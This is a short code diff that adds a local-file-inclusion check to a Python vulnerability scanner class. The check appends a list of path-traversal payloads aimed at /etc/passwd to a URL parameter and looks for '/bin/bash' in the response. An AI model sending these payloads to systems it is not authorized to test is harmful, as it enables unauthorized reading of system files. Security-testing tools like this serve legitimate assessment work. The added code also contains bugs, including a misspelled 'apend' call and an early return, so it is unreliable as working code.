@@ -205,4 +205,25 @@ class VulnScanner(object):
                     return json.dumps({"OS Command Injection": False})
 
         return json.dumps({"OS Command Injection": True, "Payload": success_payloads})
-    
+
+    # provide with a URL that contains parameter input area for the payload
+    # such as https://tahaafarooq.dev/index.php?page=
+    def lfi_url_based(self, url: str):
+        payloads = [
+            "../../../../../../../../etc/passwd",
+            "../../../../../../../../etc/passwd%00",
+            "....//....//....//....//etc/passwd",
+            "..///////..////..//////etc/passwd",
+            "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
+        ]
+
+        success_payloads = []
+
+        for payload in payloads:
+            response = requests.get(f"{url}{payload}")
+            if '/bin/bash' in response.text:
+                success_payloads.apend(payload)
+            else:
+                return json.dumps({"LFI": False})
+
+        return json.dumps({"LFI": success_payloads})
